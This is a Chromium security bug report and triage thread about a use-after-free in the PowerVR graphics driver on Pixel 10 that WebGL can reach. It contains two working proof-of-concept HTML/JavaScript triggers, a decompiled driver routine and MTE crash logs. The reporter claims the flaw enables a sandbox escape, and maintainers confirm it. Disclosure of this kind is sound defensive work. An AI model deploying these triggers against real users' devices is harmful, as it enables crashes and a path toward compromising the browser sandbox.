# Chrome sandbox escape via libGLESv2_powervr.so

| Field | Value |
|-------|-------|
| **Issue ID** | [474266014](https://issues.chromium.org/issues/474266014) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Blink>WebGL |
| **Platforms** | Android |
| **Reporter** | ha...@gmail.com |
| **Assignee** | ge...@google.com |
| **Created** | 2026-01-08 |
| **Bounty** | $32,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

The root cause is a concurrency failure within the PowerVR driver's internal state machine. Specifically, the driver lacks sufficient reference counting or synchronization locks to protect the GLES3Context structures when a resource destruction event (like a canvas resize) occurs simultaneously with a rapid stream of state-change commands (glScissor). MTE on the Pixel 10 identifies this as a Tag Mismatch, confirming that SetScissor is attempting to operate on a memory object that has already been deallocated.

VERSION
Chrome Version: latest
Operating System: android with powervr

REPRODUCTION CASE

1. access poc.html on pixel10 with mte enable
2. adb logcat

```
<script>

    const trigger = () => {
        const workerCode = `
            onmessage = function() {
                const canvas = new OffscreenCanvas(100, 100);
                const gl = canvas.getContext('webgl2');
                if(!gl) return;
                
                setInterval(() => {
                    for (let i = 0; i < 1000; i++) {
                        gl.enable(gl.SCISSOR_TEST);
                        gl.scissor(Math.random()*50, Math.random()*50, 10, 10);
                        if (i % 20 === 0) {
                            canvas.width = (i % 2 === 0) ? 10 : 11;
                        }
                    }
                    gl.clear(gl.COLOR_BUFFER_BIT);
                }, 0);
            }
        `;

        const blob = new Blob([workerCode], { type: 'text/javascript' });
        const url = URL.createObjectURL(blob);
        
        for (let i = 0; i < 10; i++) {
            const worker = new Worker(url);
            worker.postMessage('start');
        }
    };

    trigger();

</script>

```

Many people have encountered this crash; I've only analyzed the causes from others. This vulnerability has existed for a long time but hasn't been fixed. It's a vulnerability that can cause sandbox escape on Android Chrome or browsers using the Chromium kernel, and it should be fixed immediately.This is a vulnerability that's easy to reproduce; my proof-of-concept (PoC) should allow you to reproduce it quickly. If you can't reproduce it, simply visit <https://panic.com/transmit/> and scroll around the page for a bit.

```
type: crash
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/blazer/blazer:16/BP4A.251205.006.E1/2025122501:user/release-keys'
Kernel Release: '6.6.119-android15-8-gf9fb720507e2-4k'
Revision: 'MP1.0'
ABI: 'arm64'
Timestamp: 2025-12-28 02:25:57.567181303-0500
Process uptime: 124s
Executable: /system/bin/app_process64
Cmdline: app.vanadium.browser:privileged_process2
pid: 30726, tid: 30750, name: CrGpuMain  >>> app.vanadium.browser:privileged_process2 <<<
uid: 10138
tagged_addr_ctrl: 000000000007fff7 (PR_TAGGED_ADDR_ENABLE, PR_MTE_TCF_SYNC, PR_MTE_TCF_ASYNC, mask 0xfffe)
pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
esr: 0000000092000011 (Data Abort Exception 0x24)
signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x0000dcf7cb21b160 (read)
    x0  0a00dddce992f000  x1  0000000000000000  x2  0000000000000000  x3  0000000000000000
    x4  0000000000000040  x5  0000000000000040  x6  0000000000000000  x7  0000db16a2556413
    x8  0a00dddce992f1e8  x9  0a00dddce993a000  x10 0f00dcf7cb21b060  x11 0000000000000001
    x12 0000000000000000  x13 0000000000000000  x14 0000db16b3f38fb0  x15 0000db16af631000
    x16 0000db1742528dd0  x17 0000de4e62ac5640  x18 0000db16b2944000  x19 0a00dddce992f000
    x20 0000000000000040  x21 0000000000000040  x22 0000000000000000  x23 0000000000000000
    x24 0000000000000000  x25 000000000000b048  x26 0000db1200f8079c  x27 0000db16af4c9000
    x28 0000db16b3ff4040  x29 0000db16b3f38fb0
    lr  0000db1742528eb8  sp  0000db16b3f38fa0  pc  0000db1742528f6c  pst 0000000080001000
    esr 0000000092000011

25 total frames
backtrace:
      #00 pc 000000000010ff6c  /vendor/lib64/egl/libGLESv2_powervr.so (SetScissor+76) (BuildId: 9a7a0b1a4e57d0209e2ced81459460aa)
      #01 pc 000000000010feb4  /vendor/lib64/egl/libGLESv2_powervr.so (Impl_glScissor(int, int, int, int, GLES3Context_TAG*) (.__uniq.77782139865804364555287636204600767741)+100) (BuildId: 9a7a0b1a4e57d0209e2ced81459460aa)
      #02 pc 00000000094a13ec  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #03 pc 00000000094e184c  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #04 pc 00000000095ac5d8  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #05 pc 00000000085c0fac  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #06 pc 0000000006d776e4  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #07 pc 000000000650b078  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #08 pc 00000000052a1260  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #09 pc 00000000079940d8  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #10 pc 0000000007ebead4  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #11 pc 000000000c18a38c  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #12 pc 0000000004e2788c  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #13 pc 0000000004e28af8  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #14 pc 0000000007d5a7e0  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #15 pc 0000000007d5a404  /product/app/TrichromeLibrary/TrichromeLibrary.apk!libmonochrome_64.so (offset 0x918000) (BuildId: d9a5874e02b3783d2453020be8ea37417d73f5b6)
      #16 pc 0000000000316900  /apex/com.android.art/lib64/libart.so (art_quick_generic_jni_trampoline+144) (BuildId: beb7fbd1d32b8638db451308cec29e5b)
      #17 pc 00000000007c31cc  /data/dalvik-cache/arm64/product@app@TrichromeChrome@TrichromeChrome.apk@classes.dex (ab1.run+2060)
      #18 pc 00000000000a95e0  /system/framework/arm64/boot.oat (java.lang.Thread.run+64) (BuildId: 83c55c7af947c7428eded573796085d1b82ebd45)
      #19 pc 00000000002ff594  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: beb7fbd1d32b8638db451308cec29e5b)
      #20 pc 00000000002711c0  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+224) (BuildId: beb7fbd1d32b8638db451308cec29e5b)
      #21 pc 000000000049ce4c  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1180) (BuildId: beb7fbd1d32b8638db451308cec29e5b)
      #22 pc 000000000049c99c  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+12) (BuildId: beb7fbd1d32b8638db451308cec29e5b)
      #23 pc 0000000000091584  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: b2e2593ea9af5cb426017f2c32a8fcf5)
      #24 pc 00000000000813d4  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: b2e2593ea9af5cb426017f2c32a8fcf5)

Memory tags around the fault address (0xdcf7cb21b160), one tag per 16 bytes:
      0xdcf7cb21a900: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21aa00: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21ab00: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21ac00: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21ad00: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21ae00: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21af00: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b000: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
    =>0xdcf7cb21b100: 0  0  0  0  0  0 [0] 0  0  0  0  0  0  0  0  0
      0xdcf7cb21b200: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b300: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b400: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b500: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b600: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b700: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
      0xdcf7cb21b800: 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0

Learn more about MTE reports: https://source.android.com/docs/security/test/memory-safety/mte-reports

```

## Timeline

### dr...@chromium.org (2026-01-08)

[security triage] Unfortunately I don't have an MTE-enabled device to test with. jrprice@, petermcneeley@ - I see you've addressed similar bugs in the past. Do you have the hardware needed to help to reproduce this?

### ha...@gmail.com (2026-01-09)

```
void SetScissor(long param_1,ulong param_2,int param_3,int param_4,uint param_5,int param_6)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  long lVar5;
  undefined1 uVar6;
  long lVar7;
  
  lVar5 = param_1 + (param_2 & 0xffffffff) * 0x18;
  if ((((param_3 == *(int *)(lVar5 + 0x1e8)) && (param_4 == *(int *)(lVar5 + 0x1ec))) &&
      (param_5 == *(uint *)(lVar5 + 0x1f0))) && (param_6 == *(int *)(lVar5 + 500))) {
    if ((*(byte *)(param_1 + 0x1d1) >> 5 & 1) != 0) {
      LogGLES3Warning(param_1,0x8250,0x9148,&.str.llvm.14424488490915974381,
                      "The specified scissor parameters are identical to the existing ones, this is a redundant operation!"
                      ,0);
      return;
    }
  }
  else {
    *(int *)(lVar5 + 0x1e8) = param_3;
    *(int *)(lVar5 + 0x1ec) = param_4;
    *(uint *)(lVar5 + 0x1f0) = param_5;
    *(int *)(lVar5 + 500) = param_6;
    lVar7 = *(long *)(param_1 + 0xb028);
    *(undefined1 *)(param_1 + 0xb055) = 1;
    if (((*(int *)(lVar7 + 0x100) < param_3) || (*(int *)(lVar7 + 0x104) < param_4)) ||
       (((int)(param_5 + param_3) < *(int *)(lVar7 + 4) + *(int *)(lVar7 + 0x100) ||
        (param_6 + param_4 < *(int *)(lVar7 + 8) + *(int *)(lVar7 + 0x104))))) {
      uVar6 = 0;
    }
    else {
      uVar6 = 1;
    }
    *(undefined1 *)(param_1 + 0xb054) = uVar6;
    uVar3 = *(uint *)(lVar5 + 500);
    uVar1 = param_5;
    if (0xbffe < param_5) {
      uVar1 = 0xbfff;
    }
    uVar4 = *(uint *)(param_1 + 0x1d8);
    if (param_3 < 1) {
      uVar1 = param_5;
    }
    uVar2 = uVar3;
    if (0xbffe < uVar3) {
      uVar2 = 0xbfff;
    }
    if (param_4 < 1) {
      uVar2 = uVar3;
    }
    *(uint *)(lVar5 + 0x1f8) = uVar1;
    *(uint *)(lVar5 + 0x1fc) = uVar2;
    *(uint *)(param_1 + 0x1d8) = uVar4 | 1;
  }
  return;
}

```

The SetScissor function is responsible for updating the hardware clipping rectangle. The vulnerability exists in the validation phase of the function:

Resource Fetching: The driver retrieves a pointer to the active Render Surface (the "canvas") from the Render Context (param\_1) at offset 0xb028: lVar7 = \*(long \*)(param\_1 + 0xb028);

Unsynchronized Use: Immediately following this fetch, the driver dereferences lVar7 to compare the requested scissor coordinates (param\_3, param\_4, etc.) against the physical dimensions of the surface: if (((\*(int *)(lVar7 + 0x100) < param\_3) || (*(int \*)(lVar7 + 0x104) < param\_4)) ...)

### ha...@gmail.com (2026-01-12)

access m.uber.com ,can trigger this UAF.But you nedd enable mte in chrome.

```
01-12 16:46:09.321 31718 31718 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
01-12 16:46:09.321 31718 31718 F DEBUG   : Build fingerprint: 'google/frankel/frankel:16/BP4A.251205.006.C2/14586866:user/release-keys'
01-12 16:46:09.321 31718 31718 F DEBUG   : Kernel Release: '6.6.98-android15-8-g4b48560cd07d-ab14239520-4k'
01-12 16:46:09.321 31718 31718 F DEBUG   : Revision: 'MP1.0'
01-12 16:46:09.321 31718 31718 F DEBUG   : ABI: 'arm64'
01-12 16:46:09.321 31718 31718 F DEBUG   : Timestamp: 2026-01-12 16:46:09.188858149+0800
01-12 16:46:09.321 31718 31718 F DEBUG   : Process uptime: 1374s
01-12 16:46:09.321 31718 31718 F DEBUG   : Executable: /system/bin/app_process64
01-12 16:46:09.321 31718 31718 F DEBUG   : Cmdline: com.android.chrome:privileged_process2
01-12 16:46:09.321 31718 31718 F DEBUG   : pid: 19528, tid: 19544, name: CrGpuMain  >>> com.android.chrome:privileged_process2 <<<
01-12 16:46:09.321 31718 31718 F DEBUG   : uid: 10214
01-12 16:46:09.321 31718 31718 F DEBUG   : tagged_addr_ctrl: 000000000007fff3 (PR_TAGGED_ADDR_ENABLE, PR_MTE_TCF_SYNC, mask 0xfffe)
01-12 16:46:09.321 31718 31718 F DEBUG   : pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
01-12 16:46:09.321 31718 31718 F DEBUG   : esr: 0000000092000011 (Data Abort Exception 0x24)
01-12 16:46:09.321 31718 31718 F DEBUG   : signal 11 (SIGSEGV), code 9 (SEGV_MTESERR), fault addr 0x0000007d9031fc80 (read)
01-12 16:46:09.321 31718 31718 F DEBUG   :     x0  0b00007ed0197050  x1  0000000000000000  x2  0000000000000000  x3  0000000000000000
01-12 16:46:09.321 31718 31718 F DEBUG   :     x4  0000000000000040  x5  0000000000000040  x6  0000000000000000  x7  0000000000000001
01-12 16:46:09.321 31718 31718 F DEBUG   :     x8  0b00007ed0197238  x9  0b00007ed01a2050  x10 0a00007d9031fb80  x11 0000000000000001
01-12 16:46:09.321 31718 31718 F DEBUG   :     x12 0000000000000000  x13 0000000000000000  x14 0000007c533375d0  x15 0000000000000030
01-12 16:46:09.321 31718 31718 F DEBUG   :     x16 0000007ca0314dd0  x17 0000007faf47eb80  x18 0000007c522f8000  x19 0b00007ed0197050
01-12 16:46:09.321 31718 31718 F DEBUG   :     x20 0000000000000040  x21 0000000000000040  x22 0000000000000000  x23 0000000000000000
01-12 16:46:09.321 31718 31718 F DEBUG   :     x24 0000000000000000  x25 000000000000b048  x26 0000007bbedda000  x27 0000007bbef32000
01-12 16:46:09.321 31718 31718 F DEBUG   :     x28 000000000000008f  x29 0000007c533375e0
01-12 16:46:09.321 31718 31718 F DEBUG   :     lr  0000007ca0314eb8  sp  0000007c533375d0  pc  0000007ca0314f6c  pst 0000000080001000
01-12 16:46:09.321 31718 31718 F DEBUG   :     esr 0000000092000011
01-12 16:46:09.321 31718 31718 F DEBUG   : 25 total frames
01-12 16:46:09.321 31718 31718 F DEBUG   : backtrace:
01-12 16:46:09.321 31718 31718 F DEBUG   :       #00 pc 000000000010ff6c  /vendor/lib64/egl/libGLESv2_powervr.so (SetScissor+76) (BuildId: 9a7a0b1a4e57d0209e2ced81459460aa)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #01 pc 000000000010feb4  /vendor/lib64/egl/libGLESv2_powervr.so (Impl_glScissor(int, int, int, int, GLES3Context_TAG*) (.__uniq.77782139865804364555287636204600767741)+100) (BuildId: 9a7a0b1a4e57d0209e2ced81459460aa)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #02 pc 000000000726a5bc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #03 pc 0000000008acd578  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #04 pc 00000000079c3724  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #05 pc 0000000007204e18  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #06 pc 00000000072049b4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #07 pc 00000000073437fc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #08 pc 00000000058cbe18  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #09 pc 0000000005867ac4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #10 pc 000000000586762c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #11 pc 0000000007297504  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #12 pc 00000000058d4ff4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #13 pc 0000000005846a8c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #14 pc 000000000580f3d8  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #15 pc 000000000580f114  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #16 pc 0000000000d47d20  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (art_jni_trampoline+112)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #17 pc 0000000000131b3c  /data/app/~~FwVb9WFnuU0uJppmlIgN9A==/com.android.chrome-cgd3VwCxxgxc7ycdyE7ilA==/oat/arm64/base.odex (ak3.run+2028)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #18 pc 000000000031d5f0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (java.lang.Thread.run+64)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #19 pc 00000000002cdd94  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #20 pc 000000000026e624  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+220) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #21 pc 00000000004c3f30  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1184) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #22 pc 00000000004c3a80  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #23 pc 000000000008a314  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
01-12 16:46:09.321 31718 31718 F DEBUG   :       #24 pc 000000000007b1f4  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
01-12 16:46:09.321 31718 31718 F DEBUG   : Learn more about MTE reports: https://source.android.com/docs/security/test/memory-safety/mte-reports

```

### pe...@google.com (2026-01-12)

There is a question as to if this reproduces under Angle (vasiliy suggested this still runs under validating command decoder)

### pe...@google.com (2026-01-12)

I wasnt able to reproduce it with the test javascript provided. Could be some minor issue.
But i was certianly able to see it with the 'panic' webpage.

I disabled pass through command decoder and the issue disappeared. Therefore enabling Angle should resolve/workaround this issue.

### ha...@gmail.com (2026-01-13)

This issue should probably be handed over to the PowerVer team for a solution. It might be solvable at the Chrome level, but it's best to leave it to the PowerVR team because you don't know if there's a workaround.

### ct...@chromium.org (2026-01-13)

Security shepherd here: Very tentatively setting security labels for this.

Reporter -- are you also able to repro on Chrome Stable or Beta?

### ha...@gmail.com (2026-01-13)

Yep,I repro on chrome 143.0.7499.192,pixel10 BP4A.251205.006.C2

### pe...@google.com (2026-01-13)

I have a meeting with the pixel 10 team tomorrow and will discuss with them.
Yes this is a real issue and i was able to reproduce on my pixel 10 device.

### ha...@gmail.com (2026-01-13)

Min poc

```

<!DOCTYPE html>
<html>
<head>
<title>PowerVR MTE Crash PoC</title>
</head>
<body>
<h3>Running WebGL MTE Crash PoC...</h3>
<div id="log"></div>
<script>
    function log(msg) {
        document.getElementById("log").innerText += msg + "\n";
        console.log(msg);
    }

    function createShader(gl, type, source) {
        let shader = gl.createShader(type);
        gl.shaderSource(shader, source);
        gl.compileShader(shader);
        return shader;
    }

    function draw(gl) {
        const vsSource = "attribute vec2 a_pos; void main() { gl_Position = vec4(a_pos, 0.0, 1.0); }";
        const fsSource = "precision mediump float; void main() { gl_FragColor = vec4(1., 1., 1., 1.); }";
        
        let vs = createShader(gl, gl.VERTEX_SHADER, vsSource);
        let fs = createShader(gl, gl.FRAGMENT_SHADER, fsSource);
        
        let p = gl.createProgram();
        gl.attachShader(p, vs);
        gl.attachShader(p, fs);
        gl.bindAttribLocation(p, 0, "a_pos");
        gl.linkProgram(p);
        gl.useProgram(p);
        
        gl.viewport(0, 0, 128, 128);
        let verts = new Float32Array([1.0, 1.0, -1.0, 1.0, -1.0, -1.0, -1.0, -1.0, 1.0, -1.0, 1.0, 1.0]);
        
        let vbo = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, vbo);
        gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
        gl.enableVertexAttribArray(0);
        gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
        
        gl.drawArrays(gl.TRIANGLES, 0, 6);
                gl.bindBuffer(gl.ARRAY_BUFFER, null);
        gl.useProgram(null);
        gl.deleteShader(vs);
        gl.deleteShader(fs);
        gl.deleteProgram(p);
        gl.deleteBuffer(vbo);
    }

    function runIteration(config) {
        try {
            var canvas = new OffscreenCanvas(128, 128);
            var gl = canvas.getContext(config.contextType, {
                depth: config.depth,
                stencil: config.stencil,
                antialias: config.antialias,
                preserveDrawingBuffer: config.preserveDrawingBuffer
            });

            if (!gl) {
                log(`Skipped: ${JSON.stringify(config)}`);
                return;
            }


            gl.clearColor(1.0, 1.0, 0.0, 1.0);
            gl.clearDepth(0.0);
            gl.clearStencil(255);
            gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT | gl.STENCIL_BUFFER_BIT);

            let bitmap = canvas.transferToImageBitmap();
            bitmap.close();

            gl.clearColor(0.0, 0.0, 0.0, 0.0);
            gl.clear(gl.COLOR_BUFFER_BIT);

            if (config.depth) {
                gl.enable(gl.DEPTH_TEST);
                gl.depthFunc(gl.GREATER);
                draw(gl); 
                gl.disable(gl.DEPTH_TEST);
                gl.clear(gl.COLOR_BUFFER_BIT);
            }

            if (config.stencil) {
                gl.enable(gl.STENCIL_TEST);
                gl.stencilOp(gl.KEEP, gl.KEEP, gl.KEEP);
                gl.stencilFunc(gl.NOTEQUAL, 0, 0xffffffff);
                draw(gl);
            }

         
            gl = null;
            canvas = null;

        } catch (e) {
            log("Error: " + e);
        }
    }

    async function start() {
        const bools = [true, false];
        const contextTypes = ["webgl2", "webgl"];

        for (let contextType of contextTypes) {
            for (let preserveDrawingBuffer of bools) {
                for (let antialias of bools) {
                    for (let depth of bools) {
                        for (let stencil of bools) {
                            let config = {contextType, preserveDrawingBuffer, antialias, depth, stencil};
                            log(`Testing config: ${JSON.stringify(config)}`);
                            
                            await new Promise(r => setTimeout(r, 50));
                            runIteration(config);
                        }
                    }
                }
            }
        }
        log("Finished all iterations. If no crash, try reloading.");
    }

    start();
</script>
</body>
</html>

```

### ch...@google.com (2026-01-13)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-01-13)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ct...@chromium.org (2026-01-13)

Discussed this in security shepherd chat. As this is now confirmed to be reachable from a non-compromised renderer, upgrading this to Sev-Critical.

### th...@chromium.org (2026-01-23)

[secondary shepherd] Raising priority to P0 to match severity S0 (source: go/dksvf). The bot should have done this but I think it did not because it already set the priority in #comment13 based on S1 before severity got raised to S0 in #comment14.

### ha...@gmail.com (2026-01-26)

Any update?The root cause is missing ref count for GLES3Context, RenderSurface,etc.

### pe...@google.com (2026-01-26)

The pixel team is working on a patch and it is being discussed if the chrome webgl implementation could also be patched.
There are quite a few related/duplicate bugs. They are either something to do with ref counting or pointers that should have been set to null but were left dangling.

### ha...@gmail.com (2026-01-26)

If the WebGL layer can be patched, this type of vulnerability can be filtered out, which is a very good fix.

### pe...@google.com (2026-01-26)

We know that Angle (the new gles decoder) does fix this issue. It just is not enabled by default for all devices.
It is easily set in the chrome flags. Im guessing nearly all the bugs of would also not be reproducible with Angle.

### ha...@gmail.com (2026-01-26)

